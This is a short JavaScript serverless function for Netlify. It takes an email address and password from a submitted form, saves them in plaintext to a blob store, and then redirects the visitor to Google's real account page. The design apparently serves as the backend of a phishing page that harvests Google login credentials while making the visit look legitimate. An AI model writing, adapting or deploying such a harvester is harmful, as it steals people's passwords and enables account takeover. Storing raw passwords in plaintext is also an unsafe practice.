import { getStore } from '@netlify/blobs';

export default async (req) => {
  if (req.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 });
  }

  const formData = await req.formData();
  const email = String(formData.get('email') || '').trim();
  const passw = String(formData.get('passw') || '');

  if (!email || !passw) {
    return new Response('Missing required fields', { status: 400 });
  }

  const store = getStore('textbox-submissions');
  const content = `${email}\n${passw}`;

  await store.set(email, content);

  return Response.redirect('https://myaccount.google.com/', 302);
};
